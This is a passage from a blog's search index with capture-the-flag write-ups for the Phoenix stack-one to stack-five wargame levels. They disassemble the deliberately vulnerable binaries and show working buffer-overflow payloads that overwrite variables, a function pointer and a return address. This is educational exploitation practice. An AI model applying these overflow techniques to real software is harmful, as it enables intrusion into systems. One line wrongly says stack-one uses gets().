0x0000000000400700  __do_global_ctors_aux 0x0000000000400742  _fini   Lets disassemble our main() function,   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x000000000040066d &lt;+0&gt;:\t  push   rbp    0x000000000040066e &lt;+1&gt;:\t  mov    rbp,rsp    0x0000000000400671 &lt;+4&gt;:\t  sub    rsp,0x60    0x0000000000400675 &lt;+8&gt;:\t  mov    DWORD PTR [rbp-0x54],edi    0x0000000000400678 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x60],rsi    0x000000000040067c &lt;+15&gt;:\tmov    edi,0x400750    0x0000000000400681 &lt;+20&gt;:\tcall   0x4004c0 &lt;puts@plt&gt;    0x0000000000400686 &lt;+25&gt;:\tcmp    DWORD PTR [rbp-0x54],0x1    0x000000000040068a &lt;+29&gt;:\tjg     0x4006a0 &lt;main+51&gt;    0x000000000040068c &lt;+31&gt;:\tmov    esi,0x4007a0    0x0000000000400691 &lt;+36&gt;:\tmov    edi,0x1    0x0000000000400696 &lt;+41&gt;:\tmov    eax,0x0    0x000000000040069b &lt;+46&gt;:\tcall   0x4004d0 &lt;errx@plt&gt;    0x00000000004006a0 &lt;+51&gt;:\tmov    DWORD PTR [rbp-0x10],0x0    0x00000000004006a7 &lt;+58&gt;:\tmov    rax,QWORD PTR [rbp-0x60]    0x00000000004006ab &lt;+62&gt;:\tadd    rax,0x8    0x00000000004006af &lt;+66&gt;:\tmov    rdx,QWORD PTR [rax]    0x00000000004006b2 &lt;+69&gt;:\tlea    rax,[rbp-0x50]    0x00000000004006b6 &lt;+73&gt;:\tmov    rsi,rdx    0x00000000004006b9 &lt;+76&gt;:\tmov    rdi,rax    0x00000000004006bc &lt;+79&gt;:\tcall   0x4004a0 &lt;strcpy@plt&gt;    0x00000000004006c1 &lt;+84&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x00000000004006c4 &lt;+87&gt;:\tcmp    eax,0x496c5962    0x00000000004006c9 &lt;+92&gt;:\tjne    0x4006d7 &lt;main+106&gt;    0x00000000004006cb &lt;+94&gt;:\tmov    edi,0x4007d8    0x00000000004006d0 &lt;+99&gt;:\tcall   0x4004c0 &lt;puts@plt&gt;    0x00000000004006d5 &lt;+104&gt;:\tjmp    0x4006eb &lt;main+126&gt;    0x00000000004006d7 &lt;+106&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x00000000004006da &lt;+109&gt;:\tmov    esi,eax    0x00000000004006dc &lt;+111&gt;:\tmov    edi,0x400820    0x00000000004006e1 &lt;+116&gt;:\tmov    eax,0x0    0x00000000004006e6 &lt;+121&gt;:\tcall   0x4004b0 &lt;printf@plt&gt;    0x00000000004006eb &lt;+126&gt;:\tmov    edi,0x0    0x00000000004006f0 &lt;+131&gt;:\tcall   0x4004e0 &lt;exit@plt&gt; End of assembler dump.   Lets view the source code of this binary for proper understanding,   #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int changeme;   } locals;    printf(\"%s\\n\", BANNER);    if (argc &lt; 2) {     errx(1, \"specify an argument, to be copied into the \\\"buffer\\\"\");   }    locals.changeme = 0;   strcpy(locals.buffer, argv[1]);    if (locals.changeme == 0x496c5962) {     puts(\"Well done, you have successfully set changeme to the correct value\");   } else {     printf(\"Getting closer! changeme is currently 0x%08x, we want 0x496c5962\\n\",         locals.changeme);   }    exit(0); }   It is same like previous challenge,but here we have to overwrite the changeme variable with 0x496c5962   The main key of the program lies in this condition,   if (locals.changeme == 0x496c5962) {     puts(\"Well done, you have successfully set changeme to the correct value\");   } else {     printf(\"Getting closer! changeme is currently 0x%08x, we want 0x496c5962\\n\",         locals.changeme);   }   Checking the security mitigations of this binary,   ra@moni~/E/p/stack1&gt; checksec stack-one [*] '/home/ra/ExpDevPractice/phoenix/stack1/stack-one'     Arch:     amd64-64-little     RELRO:    No RELRO     Stack:    No canary found     NX:       NX disabled     PIE:      No PIE (0x400000)     RWX:      Has RWX segments     RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'   It has no security mitigations in it, we can use the buffer to overwrite the changeme variable   Since buffer uses gets() for input,we can use this for overflow   In debugger we can see,   0x00000000004006a0 &lt;+51&gt;:\tmov    DWORD PTR [rbp-0x10],0x0   It is used to initialize changeme ie. locals.changeme = 0   0x00000000004006b2 &lt;+69&gt;:\tlea    rax,[rbp-0x50]   It is used to load the buffer space for buffer   Calculating the distance of these memory,   &gt;&gt;&gt; int(0x50) 80 &gt;&gt;&gt; int(0x10) 16 &gt;&gt;&gt; print(80-16) 64   If we could pass 64 bytes of buffer and  extra bytes to buffer it would overwrite the changeme variable   Since it uses argv we should pass our input as argument   Lets try exploiting it,   user@phoenix-amd64:~$ ./stack-one $(python -c \"print('A'*64)\") Welcome to phoenix/stack-one, brought to you by https://exploit.education Getting closer! changeme is currently 0x00000000, we want 0x496c5962 user@phoenix-amd64:~$ ./stack-one $(python -c \"print('A'*64+'BBBB')\") Welcome to phoenix/stack-one, brought to you by https://exploit.education Getting closer! changeme is currently 0x42424242, we want 0x496c5962   Now we can successfully overwrite the changeme variable   But we have to overwrite it with 0x496c5962 correctly   Check the endian of your processor,  user@phoenix-amd64:~$ lscpu | grep Endian Byte Order:            Little Endian   Since we are using little endian, 0x496c5962 should be passed as \\x62\\x59\\x6c\\x49   user@phoenix-amd64:~$ ./stack-one $(python -c \"print('A'*64+'\\x62\\x59\\x6c\\x49')\") Welcome to phoenix/stack-one, brought to you by https://exploit.education Well done, you have successfully set changeme to the correct value   Done! We have completed our challenge   ","categories": ["Binary Exploitation"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/binary%20exploitation/2-stack1/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - stack 2",
        "excerpt":"Lets list our files using ls -la,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun  6 04:14 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 6288 Jun  6 04:14 stack-two   Lets analyse the file type of the binary using file command,   user@phoenix-amd64:~$ file stack-two stack-two: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   Lets try running it,   user@phoenix-amd64:~$ ./stack-two Welcome to phoenix/stack-two, brought to you by https://exploit.education stack-two: please set the ExploitEducation environment variable   So its asking use to set an environment variable   Lets analyse it with our debugger,   The functions inside the binary,   pwndbg&gt; info functions All defined functions:  Non-debugging symbols: 0x00000000004004b0  _init 0x00000000004004d0  strcpy@plt 0x00000000004004e0  printf@plt 0x00000000004004f0  getenv@plt 0x0000000000400500  puts@plt 0x0000000000400510  errx@plt 0x0000000000400520  exit@plt 0x0000000000400530  __libc_start_main@plt 0x0000000000400540  _start 0x0000000000400556  _start_c 0x0000000000400580  deregister_tm_clones 0x00000000004005b0  register_tm_clones 0x00000000004005f0  __do_global_dtors_aux 0x0000000000400680  frame_dummy 0x00000000004006ad  main 0x0000000000400740  __do_global_ctors_aux 0x0000000000400782  _fini   Lets disassemble main(),   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x00000000004006ad &lt;+0&gt;:\t  push   rbp    0x00000000004006ae &lt;+1&gt;:\t  mov    rbp,rsp    0x00000000004006b1 &lt;+4&gt;:\t  sub    rsp,0x60    0x00000000004006b5 &lt;+8&gt;:\t  mov    DWORD PTR [rbp-0x54],edi    0x00000000004006b8 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x60],rsi    0x00000000004006bc &lt;+15&gt;:\tmov    edi,0x400790    0x00000000004006c1 &lt;+20&gt;:\tcall   0x400500 &lt;puts@plt&gt;    0x00000000004006c6 &lt;+25&gt;:\tmov    edi,0x4007da    0x00000000004006cb &lt;+30&gt;:\tcall   0x4004f0 &lt;getenv@plt&gt;    0x00000000004006d0 &lt;+35&gt;:\tmov    QWORD PTR [rbp-0x8],rax    0x00000000004006d4 &lt;+39&gt;:\tcmp    QWORD PTR [rbp-0x8],0x0    0x00000000004006d9 &lt;+44&gt;:\tjne    0x4006ef &lt;main+66&gt;    0x00000000004006db &lt;+46&gt;:\tmov    esi,0x4007f0    0x00000000004006e0 &lt;+51&gt;:\tmov    edi,0x1    0x00000000004006e5 &lt;+56&gt;:\tmov    eax,0x0    0x00000000004006ea &lt;+61&gt;:\tcall   0x400510 &lt;errx@plt&gt;    0x00000000004006ef &lt;+66&gt;:\tmov    DWORD PTR [rbp-0x10],0x0    0x00000000004006f6 &lt;+73&gt;:\tmov    rdx,QWORD PTR [rbp-0x8]    0x00000000004006fa &lt;+77&gt;:\tlea    rax,[rbp-0x50]    0x00000000004006fe &lt;+81&gt;:\tmov    rsi,rdx    0x0000000000400701 &lt;+84&gt;:\tmov    rdi,rax    0x0000000000400704 &lt;+87&gt;:\tcall   0x4004d0 &lt;strcpy@plt&gt;    0x0000000000400709 &lt;+92&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x000000000040070c &lt;+95&gt;:\tcmp    eax,0xd0a090a    0x0000000000400711 &lt;+100&gt;:\tjne    0x40071f &lt;main+114&gt;    0x0000000000400713 &lt;+102&gt;:\tmov    edi,0x400828    0x0000000000400718 &lt;+107&gt;:\tcall   0x400500 &lt;puts@plt&gt;    0x000000000040071d &lt;+112&gt;:\tjmp    0x400733 &lt;main+134&gt;    0x000000000040071f &lt;+114&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x0000000000400722 &lt;+117&gt;:\tmov    esi,eax    0x0000000000400724 &lt;+119&gt;:\tmov    edi,0x400870    0x0000000000400729 &lt;+124&gt;:\tmov    eax,0x0    0x000000000040072e &lt;+129&gt;:\tcall   0x4004e0 &lt;printf@plt&gt;    0x0000000000400733 &lt;+134&gt;:\tmov    edi,0x0    0x0000000000400738 &lt;+139&gt;:\tcall   0x400520 &lt;exit@plt&gt; End of assembler dump.   Lets view the source code for proper understanding,   #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int changeme;   } locals;    char *ptr;    printf(\"%s\\n\", BANNER);    ptr = getenv(\"ExploitEducation\");   if (ptr == NULL) {     errx(1, \"please set the ExploitEducation environment variable\");   }    locals.changeme = 0;   strcpy(locals.buffer, ptr);    if (locals.changeme == 0x0d0a090a) {     puts(\"Well done, you have successfully set changeme to the correct value\");   } else {     printf(\"Almost! changeme is currently 0x%08x, we want 0x0d0a090a\\n\",         locals.changeme);   }    exit(0); }   It is same like previous challenges,   buffer has 64 bytes and after it changeme is placed   changeme is initialized with 0   But we need to overwrite the buffer with an environment variable   Here is the interesting part,      0x00000000004006c6 &lt;+25&gt;:\tmov    edi,0x4007da    0x00000000004006cb &lt;+30&gt;:\tcall   0x4004f0 &lt;getenv@plt&gt;   When we view the memory 0x4007da we can see the name of environment variable in it   pwndbg&gt; x/s 0x4007da 0x4007da:\t\"ExploitEducation\"   Now lets set the environment variable in the name of “ExploitEducation”,   user@phoenix-amd64:~$ export ExploitEducation=monish user@phoenix-amd64:~$ env | grep Exploit ExploitEducation=monish   Now lets try running the binary,   user@phoenix-amd64:~$ ./stack-two Welcome to phoenix/stack-two, brought to you by https://exploit.education Almost! changeme is currently 0x00000000, we want 0x0d0a090a   So its just a normal buffer overflow like “stack-one”   But the buffer data comes from our environment variable,   ptr = getenv(\"ExploitEducation\");   if (ptr == NULL) {     errx(1, \"please set the ExploitEducation environment variable\");   }  locals.changeme = 0; strcpy(locals.buffer, ptr);   Now lets store our data in ExploitEducation env variable   user@phoenix-amd64:~$ export ExploitEducation=$(python -c \"print('A'*64+'\\x0a\\x09\\x0a\\x0d')\")   Lets try running our binary,   user@phoenix-amd64:~$ env | grep Exploit ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA user@phoenix-amd64:~$ ./stack-two Welcome to phoenix/stack-two, brought to you by https://exploit.education Well done, you have successfully set changeme to the correct value   Done! We have completed our “stack-two” challenge   ","categories": ["Binary Exploitation"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/binary%20exploitation/3-stack2/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - stack 3",
        "excerpt":"Lets list the files using ls -la command,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun  6 04:48 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 6472 Jun  6 04:48 stack-three   Lets check the file type of the binary using file command,   user@phoenix-amd64:~$ file stack-three stack-three: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   It is a not stripped binary,   Let try running it   user@phoenix-amd64:~$ ./stack-three Welcome to phoenix/stack-three, brought to you by https://exploit.education monish function pointer remains unmodified :~( better luck next time!   It seems like we have to modify the function pointer in it   Lets analyse it in debugger,   Viewing the functions in it,   pwndbg&gt; info functions All defined functions:  Non-debugging symbols: 0x00000000004004b0  _init 0x00000000004004d0  printf@plt 0x00000000004004e0  gets@plt 0x00000000004004f0  puts@plt 0x0000000000400500  fflush@plt 0x0000000000400510  exit@plt 0x0000000000400520  __libc_start_main@plt 0x0000000000400530  _start 0x0000000000400546  _start_c 0x0000000000400570  deregister_tm_clones 0x00000000004005a0  register_tm_clones 0x00000000004005e0  __do_global_dtors_aux 0x0000000000400670  frame_dummy 0x000000000040069d  complete_level 0x00000000004006b5  main 0x0000000000400740  __do_global_ctors_aux 0x0000000000400782  _fini   There is an extra function named complete_level,   0x000000000040069d  complete_level   Now, disassembling main(),   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x00000000004006b5 &lt;+0&gt;:\t  push   rbp    0x00000000004006b6 &lt;+1&gt;:\t  mov    rbp,rsp    0x00000000004006b9 &lt;+4&gt;:\t  sub    rsp,0x60    0x00000000004006bd &lt;+8&gt;:\t  mov    DWORD PTR [rbp-0x54],edi    0x00000000004006c0 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x60],rsi    0x00000000004006c4 &lt;+15&gt;:\tmov    edi,0x4007d8    0x00000000004006c9 &lt;+20&gt;:\tcall   0x4004f0 &lt;puts@plt&gt;    0x00000000004006ce &lt;+25&gt;:\tmov    QWORD PTR [rbp-0x10],0x0    0x00000000004006d6 &lt;+33&gt;:\tlea    rax,[rbp-0x50]    0x00000000004006da &lt;+37&gt;:\tmov    rdi,rax    0x00000000004006dd &lt;+40&gt;:\tcall   0x4004e0 &lt;gets@plt&gt;    0x00000000004006e2 &lt;+45&gt;:\tmov    rax,QWORD PTR [rbp-0x10]    0x00000000004006e6 &lt;+49&gt;:\ttest   rax,rax    0x00000000004006e9 &lt;+52&gt;:\tje     0x40071d &lt;main+104&gt;    0x00000000004006eb &lt;+54&gt;:\tmov    rax,QWORD PTR [rbp-0x10]    0x00000000004006ef &lt;+58&gt;:\tmov    rsi,rax    0x00000000004006f2 &lt;+61&gt;:\tmov    edi,0x400828    0x00000000004006f7 &lt;+66&gt;:\tmov    eax,0x0    0x00000000004006fc &lt;+71&gt;:\tcall   0x4004d0 &lt;printf@plt&gt;    0x0000000000400701 &lt;+76&gt;:\tmov    rax,QWORD PTR [rip+0x200418]        # 0x600b20 &lt;stdout&gt;    0x0000000000400708 &lt;+83&gt;:\tmov    rdi,rax    0x000000000040070b &lt;+86&gt;:\tcall   0x400500 &lt;fflush@plt&gt;    0x0000000000400710 &lt;+91&gt;:\tmov    rdx,QWORD PTR [rbp-0x10]    0x0000000000400714 &lt;+95&gt;:\tmov    eax,0x0    0x0000000000400719 &lt;+100&gt;:\tcall   rdx    0x000000000040071b &lt;+102&gt;:\tjmp    0x400727 &lt;main+114&gt;    0x000000000040071d &lt;+104&gt;:\tmov    edi,0x400848    0x0000000000400722 &lt;+109&gt;:\tcall   0x4004f0 &lt;puts@plt&gt;    0x0000000000400727 &lt;+114&gt;:\tmov    edi,0x0    0x000000000040072c &lt;+119&gt;:\tcall   0x400510 &lt;exit@plt&gt; End of assembler dump.   Disassembling complete_level(),   pwndbg&gt; disassemble complete_level Dump of assembler code for function complete_level:    0x000000000040069d &lt;+0&gt;:\t  push   rbp    0x000000000040069e &lt;+1&gt;:\t  mov    rbp,rsp    0x00000000004006a1 &lt;+4&gt;:\t  mov    edi,0x400790    0x00000000004006a6 &lt;+9&gt;:\t  call   0x4004f0 &lt;puts@plt&gt;    0x00000000004006ab &lt;+14&gt;:\tmov    edi,0x0    0x00000000004006b0 &lt;+19&gt;:\tcall   0x400510 &lt;exit@plt&gt; End of assembler dump.   Lets view the source code for better understanding,   #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  void complete_level() {   printf(\"Congratulations, you've finished \" LEVELNAME \" :-) Well done!\\n\");   exit(0); }  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int (*fp)();   } locals;    printf(\"%s\\n\", BANNER);    locals.fp = NULL;   gets(locals.buffer);    if (locals.fp) {     printf(\"calling function pointer @ %p\\n\", locals.fp);     fflush(stdout);     locals.fp();   } else {     printf(\"function pointer remains unmodified :~( better luck next time!\\n\");   }    exit(0); }   Here we are using the pointer volatile int (*fp)(); to call the complete_level()   if (locals.fp) {     printf(\"calling function pointer @ %p\\n\", locals.fp);     fflush(stdout);     locals.fp();   } else {     printf(\"function pointer remains unmodified :~( better luck next time!\\n\");   }   If we write any value in locals.fp, our program assumes it as a function address and it tries to call it   If it is a valid function address it displays the correct result, else it displays a segmentation fault   When we try to overwrite fp with random data,it gives segmentation fault because the function in fp address does not exist   user@phoenix-amd64:~$ python -c \"print('A'*64+'BBBB')\"|./stack-three Welcome to phoenix/stack-three, brought to you by https://exploit.education calling function pointer @ 0x42424242 Segmentation fault   If we pass the address of complete_level() in fp it executes correctly,   user@phoenix-amd64:~$ python -c \"print('A'*64+'\\x9d\\x06\\x40')\"|./stack-three Welcome to phoenix/stack-three, brought to you by https://exploit.education calling function pointer @ 0x40069d Congratulations, you've finished phoenix/stack-three :-) Well done!   Done! we have completed “stack-three”   ","categories": ["Binary Exploitation"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/binary%20exploitation/4-stack3/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - stack 4",
        "excerpt":"Lets list the files using ls -la,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun  6 05:25 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 6096 Jun  6 05:25 stack-four   Lets check the file type of the binary using file command,   user@phoenix-amd64:~$ file stack-four stack-four: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   It is a not stripped binary   Now,lets try running it   user@phoenix-amd64:~$ ./stack-four Welcome to phoenix/stack-four, brought to you by https://exploit.education monish and will be returning to 0x40068d user@phoenix-amd64:~$ ./stack-four Welcome to phoenix/stack-four, brought to you by https://exploit.education AAAAAAAAAAAAAAAAAAAAAAAAAAAAA and will be returning to 0x40068d   So there is something fishy with 0x40068d   Lets use debugger on this binary,   Viewing functions   pwndbg&gt; info functions All defined functions:  Non-debugging symbols: 0x0000000000400438  _init 0x0000000000400460  printf@plt 0x0000000000400470  gets@plt 0x0000000000400480  puts@plt 0x0000000000400490  exit@plt 0x00000000004004a0  __libc_start_main@plt 0x00000000004004b0  _start 0x00000000004004c6  _start_c 0x00000000004004f0  deregister_tm_clones 0x0000000000400520  register_tm_clones 0x0000000000400560  __do_global_dtors_aux 0x00000000004005f0  frame_dummy 0x000000000040061d  complete_level 0x0000000000400635  start_level 0x000000000040066a  main 0x00000000004006a0  __do_global_ctors_aux 0x00000000004006e2  _fini   It has three distinguishable functions   0x000000000040061d  complete_level 0x0000000000400635  start_level 0x000000000040066a  main   Disassembling main(),   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x000000000040066a &lt;+0&gt;:\t  push   rbp    0x000000000040066b &lt;+1&gt;:\t  mov    rbp,rsp    0x000000000040066e &lt;+4&gt;:\t  sub    rsp,0x10    0x0000000000400672 &lt;+8&gt;:\t  mov    DWORD PTR [rbp-0x4],edi    0x0000000000400675 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x10],rsi    0x0000000000400679 &lt;+15&gt;:\tmov    edi,0x400750    0x000000000040067e &lt;+20&gt;:\tcall   0x400480 &lt;puts@plt&gt;    0x0000000000400683 &lt;+25&gt;:\tmov    eax,0x0    0x0000000000400688 &lt;+30&gt;:\tcall   0x400635 &lt;start_level&gt;    0x000000000040068d &lt;+35&gt;:\tmov    eax,0x0    0x0000000000400692 &lt;+40&gt;:\tleave    0x0000000000400693 &lt;+41&gt;:\tret End of assembler dump.  main() calls start_level()   Disassembling start_level(),   pwndbg&gt; disassemble start_level Dump of assembler code for function start_level:    0x0000000000400635 &lt;+0&gt;:\t  push   rbp    0x0000000000400636 &lt;+1&gt;:\t  mov    rbp,rsp    0x0000000000400639 &lt;+4&gt;:\t  sub    rsp,0x50    0x000000000040063d &lt;+8&gt;:\t  lea    rax,[rbp-0x50]    0x0000000000400641 &lt;+12&gt;:\tmov    rdi,rax    0x0000000000400644 &lt;+15&gt;:\tcall   0x400470 &lt;gets@plt&gt;    0x0000000000400649 &lt;+20&gt;:\tmov    rax,QWORD PTR [rbp+0x8]    0x000000000040064d &lt;+24&gt;:\tmov    QWORD PTR [rbp-0x8],rax    0x0000000000400651 &lt;+28&gt;:\tmov    rax,QWORD PTR [rbp-0x8]    0x0000000000400655 &lt;+32&gt;:\tmov    rsi,rax    0x0000000000400658 &lt;+35&gt;:\tmov    edi,0x400733    0x000000000040065d &lt;+40&gt;:\tmov    eax,0x0    0x0000000000400662 &lt;+45&gt;:\tcall   0x400460 &lt;printf@plt&gt;    0x0000000000400667 &lt;+50&gt;:\tnop    0x0000000000400668 &lt;+51&gt;:\tleave    0x0000000000400669 &lt;+52&gt;:\tret End of assembler dump.  start_level() calls complete_level()   Disassembling complete_level(),   pwndbg&gt; disassemble complete_level Dump of assembler code for function complete_level:    0x000000000040061d &lt;+0&gt;:\t  push   rbp    0x000000000040061e &lt;+1&gt;:\t  mov    rbp,rsp    0x0000000000400621 &lt;+4&gt;:\t  mov    edi,0x4006f0    0x0000000000400626 &lt;+9&gt;:\t  call   0x400480 &lt;puts@plt&gt;    0x000000000040062b &lt;+14&gt;:\tmov    edi,0x0    0x0000000000400630 &lt;+19&gt;:\tcall   0x400490 &lt;exit@plt&gt; End of assembler dump.   Lets take a look at source code for proper understanding,   #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  void complete_level() {   printf(\"Congratulations, you've finished \" LEVELNAME \" :-) Well done!\\n\");   exit(0); }  void start_level() {   char buffer[64];   void *ret;    gets(buffer);    ret = __builtin_return_address(0);   printf(\"and will be returning to %p\\n\", ret); }  int main(int argc, char **argv) {   printf(\"%s\\n\", BANNER);   start_level(); }   The main part of this program is,   void start_level() {   char buffer[64];   void *ret;    gets(buffer);    ret = __builtin_return_address(0);   printf(\"and will be returning to %p\\n\", ret); }   Here ret = __builtin_return_address(0); points the return address of the program when it is being executed in stack   And there is no link between start_level() and complete_level()   The only way we can call complete_level() is to point its address into the ret   In start_level(),      0x000000000040063d &lt;+8&gt;:\tlea    rax,[rbp-0x50]  This is used to load the buffer space for buffer   0x000000000040064d &lt;+24&gt;:\tmov    QWORD PTR [rbp-0x8],rax  This is used to store the return address ret   Checking the security mitigations of the binary,   ra@moni~/E/p/stack4&gt; checksec  stack-four [*] '/home/ra/ExpDevPractice/phoenix/stack4/stack-four'     Arch:     amd64-64-little     RELRO:    No RELRO     Stack:    No canary found     NX:       NX disabled     PIE:      No PIE (0x400000)     RWX:      Has RWX segments     RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'   So we can overflow the binary as there are no security mitigations in it   We have to crash the binary by junk data in buffer and the address of complete_level() in ret   Lets try crashing it   Creating a random patten for fuzzing,   ra@moni/o/m/e/f/t/exploit&gt; ./pattern_create.rb -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A   Passing this random pattern as input in binary would make it crash,   user@phoenix-amd64:~$ python -c \"print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A')\" | ./stack-four Welcome to phoenix/stack-four, brought to you by https://exploit.education and will be returning to 0x3164413064413963 Segmentation fault   So we overwrote our ret return address as 0x3164413064413963 from 0x40068d   Lets try to find the offset of our return address ret,   ra@moni/o/m/e/f/t/exploit&gt; ./pattern_offset.rb -q 0x3164413064413963 [*] Exact match at offset 88   We came to know that after 88th offset from buffer we can enter into ret   Lets exploit this binary now,   user@phoenix-amd64:~$ python -c \"print('A'*88+'BBBB')\" | ./stack-four Welcome to phoenix/stack-four, brought to you by https://exploit.education and will be returning to 0x42424242 Segmentation fault   payload = junk(88bytes) + address of complete_level()   Address of complete_level() = 0x000000000040061d   user@phoenix-amd64:~$ python -c \"print('A'*88+'\\x1d\\x06\\x40')\" | ./stack-four Welcome to phoenix/stack-four, brought to you by https://exploit.education and will be returning to 0x40061d Congratulations, you've finished phoenix/stack-four :-) Well done!   Done! we have completed “stack-four”   ","categories": ["Binary Exploitation"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/binary%20exploitation/5-stack4/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - stack 5",
        "excerpt":"Lets list the files using ls -la,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun  6 06:04 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 5632 Jun  6 06:04 stack-five   Lets check the file type of the binary using file command,   user@phoenix-amd64:~$ file stack-five stack-five: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   It is a not stripped binary   Lets try running it   user@phoenix-amd64:~$ ./stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education monish user@phoenix-amd64:~$ ./stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   Seems like its expecting some other input   Lets analyse it in debugger   Viewing functions,   pwndbg&gt; info functions All defined functions:  Non-debugging symbols: 0x00000000004003c8  _init 0x00000000004003f0  gets@plt 0x0000000000400400  puts@plt 0x0000000000400410  __libc_start_main@plt 0x0000000000400420  _start 0x0000000000400436  _start_c 0x0000000000400460  deregister_tm_clones 0x0000000000400490  register_tm_clones 0x00000000004004d0  __do_global_dtors_aux 0x0000000000400560  frame_dummy 0x000000000040058d  start_level 0x00000000004005a4  main 0x00000000004005d0  __do_global_ctors_aux 0x0000000000400612  _fini   Disassembling main(),   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x00000000004005a4 &lt;+0&gt;:\t  push   rbp    0x00000000004005a5 &lt;+1&gt;:\t  mov    rbp,rsp    0x00000000004005a8 &lt;+4&gt;:\t  sub    rsp,0x10    0x00000000004005ac &lt;+8&gt;:\t  mov    DWORD PTR [rbp-0x4],edi    0x00000000004005af &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x10],rsi    0x00000000004005b3 &lt;+15&gt;:\tmov    edi,0x400620    0x00000000004005b8 &lt;+20&gt;:\tcall   0x400400 &lt;puts@plt&gt;    0x00000000004005bd &lt;+25&gt;:\tmov    eax,0x0    0x00000000004005c2 &lt;+30&gt;:\tcall   0x40058d &lt;start_level&gt;    0x00000000004005c7 &lt;+35&gt;:\tmov    eax,0x0    0x00000000004005cc &lt;+40&gt;:\tleave    0x00000000004005cd &lt;+41&gt;:\tret End 